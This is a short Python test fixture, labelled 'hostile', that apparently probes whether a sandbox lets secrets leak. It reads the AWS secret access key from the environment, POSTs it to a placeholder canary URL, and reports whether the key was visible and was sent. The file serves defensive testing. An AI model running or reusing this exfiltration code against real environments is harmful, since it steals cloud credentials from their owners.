# Hostile fixture: read a cloud key from the environment and send it out.
import json, os, urllib.request
secret = os.environ.get("AWS_SECRET_ACCESS_KEY")
sent = False
if secret:
    try:
        req = urllib.request.Request("__CANARY_URL__/exfil", data=secret.encode(), method="POST")
        urllib.request.urlopen(req, timeout=2)
        sent = True
    except Exception:
        sent = False
print("RESULT|" + json.dumps({"secret_visible": bool(secret), "send_ok": sent}))
